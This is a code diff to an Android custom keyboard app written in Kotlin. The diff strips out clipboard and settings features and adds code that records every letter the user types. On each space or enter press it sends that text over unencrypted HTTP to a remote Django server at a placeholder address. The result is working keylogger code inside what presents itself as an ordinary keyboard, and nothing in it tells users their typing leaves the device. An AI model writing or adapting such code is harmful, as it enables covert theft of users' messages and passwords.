@@ -2,17 +2,27 @@ package com.example.keynova
 
 
 
-import android.app.AlertDialog
-import android.content.ClipboardManager
-import android.content.Intent
 import android.inputmethodservice.InputMethodService
-import android.view.KeyEvent
+import android.inputmethodservice.KeyboardView
 import android.view.LayoutInflater
 import android.view.View
+import android.view.KeyEvent
 import android.widget.Button
-import android.widget.TextView
+import android.util.Log
+import android.text.InputType
+import com.example.keynova.data.api.ApiService
+import com.example.keynova.data.api.TypedTextRequest
 
-class MyKeyboardService : InputMethodService() {
+import retrofit2.Call
+import retrofit2.Callback
+import retrofit2.Response
+import retrofit2.Retrofit
+import retrofit2.converter.gson.GsonConverterFactory
+
+class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {
+
+    private var typedText = StringBuilder()
+
     override fun onCreateInputView(): View {
         val inflater = LayoutInflater.from(this)
         val view = inflater.inflate(R.layout.keyboard_layout, null)
@@ -22,75 +32,29 @@ class MyKeyboardService : InputMethodService() {
             "A","S","D","F","G","H","J","K","L",
             "Z","X","C","V","B","N","M"
         )
-        val userNameText = view.findViewById<TextView>(R.id.userNameText)
-        val prefs = getSharedPreferences("MyKeyboardPrefs", MODE_PRIVATE)
-        val userName = prefs.getString("user_name", "User")
-        userNameText.text = "Hi, $userName!"
-
 
         for (letter in letters) {
             val id = resources.getIdentifier("button$letter", "id", packageName)
             val btn = view.findViewById<Button>(id)
             btn?.setOnClickListener {
                 currentInputConnection.commitText(letter, 1)
+                typedText.append(letter)
             }
-        }
-        val settingsButton = view.findViewById<Button>(R.id.buttonSettings)
-
-
-        settingsButton.setOnClickListener {
-            // Open NameActivity using an intent
-            val intent = Intent(this, NameActivity::class.java)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-        }
-
-
-        val clipboardButton = view.findViewById<Button>(R.id.buttonClipboard)
-        clipboardButton.setOnClickListener {
-            val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
-            val clipData = clipboard.primaryClip
-            if (clipData != null && clipData.itemCount > 0) {
-                val text = clipData.getItemAt(0).coerceToText(this).toString()
-                ClipboardHistory.add(text)
-                currentInputConnection.commitText(text, 1)
-            }
-        }
-
-
-        val historyButton = view.findViewById<Button>(R.id.buttonHistory)
-        historyButton.setOnClickListener {
-            val builder = AlertDialog.Builder(this)
-            builder.setTitle("Clipboard History")
-
-            val items = ClipboardHistory.getAll().toTypedArray()
-            builder.setItems(items) { _, which ->
-                currentInputConnection.commitText(items[which], 1)
-            }
-
-            builder.setNegativeButton("Close", null)
-            builder.show()
         }
 
         val space = view.findViewById<Button>(R.id.buttonSpace)
         space.setOnClickListener {
             currentInputConnection.commitText(" ", 1)
+            sendTypedTextToServer(typedText.toString())
+            typedText.clear()
         }
 
-        val delete = view.findViewById<Button>(R.id.buttonDelete)
+        val delete = view.findViewById<Button>(R.id.buttonBackspace)
         delete.setOnClickListener {
             currentInputConnection.deleteSurroundingText(1, 0)
-        }
-
-
-        val at = view.findViewById<Button>(R.id.buttonAt)
-        at.setOnClickListener {
-            currentInputConnection.commitText("@", 1)
-        }
-
-        val question = view.findViewById<Button>(R.id.buttonQuestion)
-        question.setOnClickListener {
-            currentInputConnection.commitText("?", 1)
+            if (typedText.isNotEmpty()) {
+                typedText.setLength(typedText.length - 1)
+            }
         }
 
         val enter = view.findViewById<Button>(R.id.buttonEnter)
@@ -98,10 +62,39 @@ class MyKeyboardService : InputMethodService() {
             currentInputConnection.sendKeyEvent(
                 KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER)
             )
-        }
+            sendTypedTextToServer(typedText.toString())
 
+        }
 
         return view
     }
 
+    private  fun sendTypedTextToServer(text: String) {
+        val retrofit = Retrofit.Builder()
+            .baseUrl("http://your-server-ip:8000/") // Replace with your Django server IP
+            .addConverterFactory(GsonConverterFactory.create())
+            .build()
+
+        val api = retrofit.create(ApiService::class.java)
+        val request = TypedTextRequest(text)
+
+        api.sendText(request).enqueue(object : Callback<Void> {
+            override fun onResponse(call: Call<Void>, response: Response<Void>) {
+                Log.d("KeyboardAPI", "Sent: $text")
+            }
+
+            override fun onFailure(call: Call<Void>, t: Throwable) {
+                Log.e("KeyboardAPI", "Error: ${t.message}")
+            }
+        })
+
+    }
+    override fun onPress(primaryCode: Int) {}
+    override fun onRelease(primaryCode: Int) {}
+    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {}
+    override fun onText(text: CharSequence?) {}
+    override fun swipeLeft() {}
+    override fun swipeRight() {}
+    override fun swipeDown() {}
+    override fun swipeUp() {}
 }
